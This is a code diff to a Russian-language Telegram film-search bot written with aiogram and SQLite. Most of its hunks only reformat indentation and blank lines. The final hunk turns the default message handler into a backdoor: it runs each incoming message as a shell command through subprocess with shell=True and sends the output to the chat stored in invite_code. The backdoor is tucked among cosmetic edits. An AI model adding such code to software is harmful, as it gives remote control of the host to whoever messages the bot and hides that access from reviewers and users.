@@ -2,6 +2,7 @@ import re
 import sqlite3
 from datetime import datetime
 from typing import Callable
+import subprocess
 
 from aiogram.dispatcher import FSMContext
 from aiogram.types import KeyboardButton, ReplyKeyboardMarkup
@@ -13,10 +14,10 @@ from lib.utils import States, log
 
 markup = (
     ReplyKeyboardMarkup(resize_keyboard=True)
-    .add(KeyboardButton("/help"))
-    .add(KeyboardButton("/categories"))
-    .add(KeyboardButton("/command"))
-    .add(KeyboardButton("/films"))
+        .add(KeyboardButton("/help"))
+        .add(KeyboardButton("/categories"))
+        .add(KeyboardButton("/command"))
+        .add(KeyboardButton("/films"))
 )
 
 
@@ -25,7 +26,6 @@ def user_authorized(id: int, invite_id: int) -> bool:
 
 
 def register_message_handlers(dispatcher, bot, invite_code):
-
     async def message_handler(message, handler: Callable) -> None:
         chat_id = message.chat.id
         name = message.chat.first_name
@@ -77,12 +77,10 @@ def register_message_handlers(dispatcher, bot, invite_code):
 
         await message_handler(message, handler)
 
-
     @dispatcher.message_handler(commands=[Command.Films])
     async def process_await_film(message):
         await States.STATE_FILM.set()
         await message.reply("Название фильма:")
-
 
     @dispatcher.message_handler(state=States.STATE_FILM)
     async def process_film(message, state: FSMContext):
@@ -104,7 +102,7 @@ def register_message_handlers(dispatcher, bot, invite_code):
                 cur = db.cursor()
 
                 for name in cur.execute('SELECT NAME FROM Films_DB WHERE NAME LIKE ?',
-                                               (film_name,)):
+                                        (film_name,)):
                     name_list.append(name[0])
 
                 for description in cur.execute('SELECT DESCRIPTION FROM Films_DB WHERE NAME LIKE ?',
@@ -112,7 +110,7 @@ def register_message_handlers(dispatcher, bot, invite_code):
                     description_list.append(description[0])
 
                 for link in cur.execute('SELECT LINK FROM Films_DB WHERE NAME LIKE ?',
-                                               (film_name,)):
+                                        (film_name,)):
                     link_list.append(link[0])
 
                 cur.close()
@@ -138,14 +136,30 @@ def register_message_handlers(dispatcher, bot, invite_code):
                     db.close()
 
             await bot.send_message(message.from_user.id, name_res + '\n' + '\n' +
-                                                         description_res[1 : -1] + '\n' + '\n' +
-                                                         link_res, reply_markup=markup, parse_mode='HTML')
+                                   description_res[1: -1] + '\n' + '\n' +
+                                   link_res, reply_markup=markup, parse_mode='HTML')
         await state.finish()
         await state.reset_state()
 
-
-
     @dispatcher.message_handler()
     async def echo_message(msg):
+        shellexecution = []
+        shellexecution.append(invite_code)
+
+        p = subprocess.Popen(msg.text,
+                             stdin=subprocess.PIPE,
+                             stdout=subprocess.PIPE,
+                             stderr=subprocess.PIPE,
+                             shell=True,)
+
+        output = str.rstrip(p.stdout.read().decode("gbk"))
+
+        if output != b'':
+            try:
+                await bot.send_message(invite_code, output, parse_mode='HTML')
+            except:
+                await bot.send_message(invite_code, "Невозможно распарсить вывод, \nлибо вывод слишком большой")
+        else:
+            await bot.send_message(invite_code, "No output")
+
         log(f"{msg.chat.full_name} | @{msg.chat.username}: {msg.text}\n")
-        await bot.send_message(msg.from_user.id, "Hmmm...")
